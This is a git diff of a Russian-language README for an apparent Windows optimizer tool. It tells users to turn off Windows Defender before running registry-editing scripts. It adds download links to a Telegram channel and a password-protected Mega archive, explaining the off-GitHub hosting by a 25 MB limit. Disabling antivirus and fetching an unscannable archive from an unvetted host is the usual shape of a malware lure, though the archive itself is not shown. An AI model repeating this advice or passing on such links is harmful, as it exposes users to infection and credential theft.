@@ -35,9 +35,12 @@
 Перед запуском рекомендуется временно отключить **Защитник Windows (Defender)**, чтобы избежать блокировки скриптов, выполняющих настройку реестра.
 
 ## 📝 Лицензия
-Проект распространяется под лицензией MIT.
+Проект распространяется под лицензией MIT. 
+
 ##скачать можно здесь 
+telegram
 https://t.me/kyzo_optimizator
+mega
 https://mega.nz/file/MBVERYZZ#sqGM8q6KvqdDMtunamnm2MifROrBkrMZKhdJQnDh7zg 
 ## пароль **kyzoSetup**
 git hub не позволяет больше 25mb 
